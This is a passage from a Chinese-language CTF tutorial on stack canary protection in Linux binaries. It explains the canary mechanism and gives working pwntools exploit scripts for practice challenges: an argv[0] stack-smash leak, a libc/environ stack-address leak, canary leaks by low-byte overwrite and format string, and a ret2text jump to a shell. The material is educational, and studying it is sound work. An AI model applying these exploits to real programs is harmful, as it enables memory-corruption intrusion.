aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启 Canary 保护的 stack 结构大概如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">       High Address   <span class="token operator">|</span>                 <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>               <span class="token operator">|</span> args            <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>               <span class="token operator">|</span> <span class="token keyword">return</span> address  <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>       rbp <span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token operator">|</span> old ebp         <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>     rbp<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token operator">|</span> canary value    <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>               <span class="token operator">|</span> local variables <span class="token operator">|</span>Low Address    <span class="token operator">|</span>                 <span class="token operator">|</span>       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>wiki：）x64程序</p><blockquote><p>32位是取gs寄存器的值放在rbp-4处</p></blockquote><p>当程序启用 Canary 编译后，在函数序言部分会取<strong>fs 寄存器 0x28 处的值</strong>，存放在栈中 rbp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov    rax, qword ptr fs:[0x28] ;取fs:[0x28]的值给raxmov    qword ptr [rbp - 8], rax ;把rax的值给rbp-8的位置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov    rdx,QWORD PTR [rbp-0x8]xor    rdx,QWORD PTR fs:0x28je     0x4005d7 &lt;main+65&gt;call   0x400460 &lt;__stack_chk_fail@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果 Canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">eglibc<span class="token operator">-</span><span class="token number">2.19</span><span class="token operator">/</span>debug<span class="token operator">/</span>stack_chk_fail<span class="token punctuation">.</span>c<span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">/* The loop is added only to keep gcc happy.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>                    msg<span class="token punctuation">,</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">:</span> <span class="token string">"&lt;unknown&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这意味可以通过劫持 <code>__stack_chk_fail</code> 的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容 (参见 下文stack smash)。</p><p>进一步，对于 Linux 来说，<strong>fs 寄存器实际指向的是当前栈的 TLS 结构</strong>，fs:0x28 指向的正是 stack_guard。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment">/* Pointer to the TCB.  Not necessarily the                       thread descriptor used by libpthread.  */</span>  <span class="token class-name">dtv_t</span> <span class="token operator">*</span>dtv<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>       <span class="token comment">/* Pointer to the thread descriptor.  */</span>  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> sysinfo<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> stack_guard<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token class-name">tcbhead_t</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</strong></p><p>事实上，TLS 中的值由函数 security_init 进行初始化。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token function">security_init</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span>  <span class="token comment">// glibc直接使用了_dl_random的值并没有给赋值</span>  <span class="token comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span>  <span class="token comment">//将_dl_random的最后一个字节设置为0x0</span>  <span class="token class-name">uintptr_t</span> stack_chk_guard <span class="token operator">=</span> <span class="token function">_dl_setup_stack_chk_guard</span> <span class="token punctuation">(</span>_dl_random<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 设置Canary的值到TLS中</span>  <span class="token function">THREAD_SET_STACK_GUARD</span> <span class="token punctuation">(</span>stack_chk_guard<span class="token punctuation">)</span><span class="token punctuation">;</span>  _dl_random <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">THREAD_SET_STACK_GUARD</span><span class="token expression"><span class="token punctuation">(</span>value<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>  <span class="token expression"><span class="token function">THREAD_SETMEM</span> <span class="token punctuation">(</span>THREAD_SELF<span class="token punctuation">,</span> header<span class="token punctuation">.</span>stack_guard<span class="token punctuation">,</span> value<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc -fstack-protector-all -o test test.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Func1 int a = %d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"func2"</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Func2 char s[10] = %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">func3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> <span class="token string">"hello  world"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Func3 char *s = %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">func3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看func1函数汇编代码：</p><ul><li>可以看到，在func1函数开始时，会把fs:[0x28]的值放在rbp-8处</li><li>func1函数返回时，会检查rbp-8处的值与fs:[0x28]的值是否相等（func2,func3类似</li></ul><p><img src="/2023/04/09/canary/2.png"></p><p><img src="/2023/04/09/canary/1.png"></p><p>当发生栈溢出时：</p><p><img src="/2023/04/09/canary/3.png"></p><h1 id="Canary绕过与利用"><a href="#Canary绕过与利用" class="headerlink" title="Canary绕过与利用"></a>Canary绕过与利用</h1><h2 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。</p><p><strong>所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 <code>__fortify_fail</code> 函数中就会输出我们想要的信息。（相关__stack_chk_fail等函数见上文</strong></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="32C3-CTF-readme"><a href="#32C3-CTF-readme" class="headerlink" title="32C3 CTF readme"></a>32C3 CTF readme</h4><p>程序开启了Canary和NX保护</p><p><img src="/2023/04/09/canary/2-1.png"></p><p>程序逻辑：</p><ul><li>该题为读flag题，flag存储在byte_600D20数组中</li><li>首先输入name，这里使用_IO_gets函数，存在溢出</li><li>然后让我们输入flag，我们输入的flag会把byte_600D20数组中的值给覆盖掉，对于我们没有覆盖的byte_600D20中的值，程序会直接把其覆写为0</li></ul><p><img src="/2023/04/09/canary/2-2.png"></p><p>思路：</p><blockquote><ul><li><strong>在 ELF 内存映射时，bss 段会被映射两次</strong>，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找。</li><li>所以byte_600D20中的flag在400D20中其实还有一份，但是得程序加载才会有</li><li>所以我们可以把argv[0]修改为400D20，这样我们触发栈溢出，这样由于Canary保护检测，就会输出保存信息和argv[0]，这样就输出了flag</li></ul></blockquote><p><img src="/2023/04/09/canary/2-4.png"></p><p>查找argv[0]地址：0x7fffffffdf08</p><p><img src="/2023/04/09/canary/2-5.png"></p><p>计算argv[0]距离_IO_gets函数输入点的偏移：0x7fffffffdf08 - 0x7fffffffdcf0 = 536</p><p><img src="/2023/04/09/canary/2-6.png"></p><p>利用栈溢出覆盖argv[0]为0x400D20，exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./smashes"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">536</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400D20</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name? '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'flag: '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/09/canary/2-7.png"></p><h4 id="2018-网鼎杯-guess"><a href="#2018-网鼎杯-guess" class="headerlink" title="2018 网鼎杯 - guess"></a>2018 网鼎杯 - guess</h4><p>前置知识：在linux应用程序运行时，内存的最高端是环境/参数节（environment/arguments section） 用来存储系统环境变量的一份复制文件，进程在运行时可能需要。 例如，运行中的进程，可以通过环境变量来访问路径、shell 名称、主机名等信息。 该节是可写的，因此在格式化字符串和缓冲区溢出攻击中都可以攻击该节。 *environ指针指向栈地址(环境变量位置)，有时它也成为攻击的对象，泄露栈地址，篡改栈空间地址，进而劫持控制流。</p><p><strong>_environ：</strong></p><ul><li><p><strong>在Linux C中，environ是一个全局变量，它储存着系统的环境变量。</strong></p></li><li><p>它储存在libc中，因此environ是沟通libc地址与栈地址的桥梁。</p></li></ul><p><strong>environ利用：</strong></p><ul><li><strong>通过libc找到environ地址后，泄露environ地址处的值，可以得到环境变量地址，环境变量保存在栈中，通过偏移可以得到栈上任意变量的地址。</strong></li></ul><p>程序开启了Canary和NX保护，程序逻辑如下：</p><ul><li>将flag.txt文件中的flag放入real_flag中</li><li>fork创建子进程（3次，所以我们只有三次机会</li><li>使用gets函数输入猜测的guess_flag，存在溢出</li></ul><p>这题与前面32C3 CTF readme这题类似，唯一不同的是这次的flag是放在了栈上，而不像上一题直接放在BSS段中，所以我们要泄漏flag存放的位置（栈地址</p><p>思路如下：</p><ul><li><p>找到argv[0]与输入点的偏移</p></li><li><p>泄漏存放real_flag的栈地址</p><ul><li>计算real_flag与environ的偏移</li><li>泄漏libc，计算environ的地址，然后泄漏environ栈地址</li><li>计算real_flag的栈地址</li></ul></li><li><p>将argv[0]地址的换成real_flag栈地址，然后触发栈溢出，打印出flag</p></li></ul><p><img src="/2023/04/09/canary/4-1.png"></p><p>1、找到argv[0]与输入点的偏移：0x7fffffffdf08 - 0x7fffffffdde0 = 0x128</p><p><img src="/2023/04/09/canary/4-2.png"></p><p>2、泄漏存放real_flag的栈地址</p><ul><li>计算real_flag与environ的偏移：0x7fffffffdf18 - 0x7fffffffddb0 = 0x168</li><li>泄漏libc，计算environ的地址，然后泄漏environ栈地址：environ_addr</li><li>计算real_flag的栈地址：environ_addr - 0x168</li></ul><p><img src="/2023/04/09/canary/4-3.png"></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./guess"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./guess"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x128</span> <span class="token operator">+</span> contentio<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'flag\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> flag<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'***: '</span><span class="token punctuation">)</span><span class="token keyword">return</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' terminated'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#泄漏libc</span>puts <span class="token operator">=</span> leak<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#泄漏put函数got表项内容</span>libc_base <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#计算libc_base</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>environ <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_environ'</span><span class="token punctuation">]</span> <span class="token comment">#计算environ地址</span>environ <span class="token operator">=</span> leak<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#泄漏栈地址</span>flag <span class="token operator">=</span> environ <span class="token operator">-</span> <span class="token number">0x168</span> <span class="token comment">#计算flag栈地址</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>leak<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/09/canary/4-4.png"></p><h2 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>1、Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要多次溢出，第一次溢出泄露 Canary，之后再次溢出控制执行流程。</p><ul><li>可以看到Canary的低字节为00</li></ul><p><img src="/2023/04/09/canary/5-0.png"></p><p>2、格式化字符串直接泄漏Canary的值</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>测试程序（wiki：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc -m32 -no-pie -0 leak_canary leak_canary.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hello Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该程序开启了Canary和NX保护</p><ul><li>vuln函数中read读入0x200个字符，存在溢出</li><li>vuln函数中printf(buf)存在格式化字符串漏洞</li><li>存在getshell后门函数</li></ul><blockquote><p>有格式化字符串漏洞和后门函数，是不是想hijack retaddr</p><p>有格式化字符串漏洞，并且没有开启RELRO保护，是不是想hijack GOT</p></blockquote><p>1、覆盖 Canary 的低字节</p><p>Canary被放在了ebp - 0xc处，在IDA里面可以看到ebp距离输入点的偏移为0x70 ==&gt; Canary距离输入点的偏移为0x70 - 0xc = 0x64 == 100</p><p><img src="/2023/04/09/canary/5-1.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./leak_canary"</span><span class="token punctuation">)</span>shell <span class="token operator">=</span> <span class="token number">0x80485A4</span><span class="token comment">#把Canary的低字节覆盖为'A'即0x41</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">101</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'!\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x41</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span><span class="token string">'dead'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、格式化字符串直接泄漏Canary</p><ul><li>调试得：Canary为格式化字符串的第31个参数 ==&gt; %31$p可以泄漏Canary的值</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./leak_canary"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./leak_canary"</span><span class="token punctuation">)</span><span class="token comment">#泄漏canary</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'!\n'</span><span class="token punctuation">,</span> <span class="token string">'%31$p'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'canary: %s'</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token comment">#ret2text</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="one-by-one爆破Canary"><a href="#one-by-one爆破Canary" class="headerlink" title="one by one爆破Canary"></a>one by one爆破Canary</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" 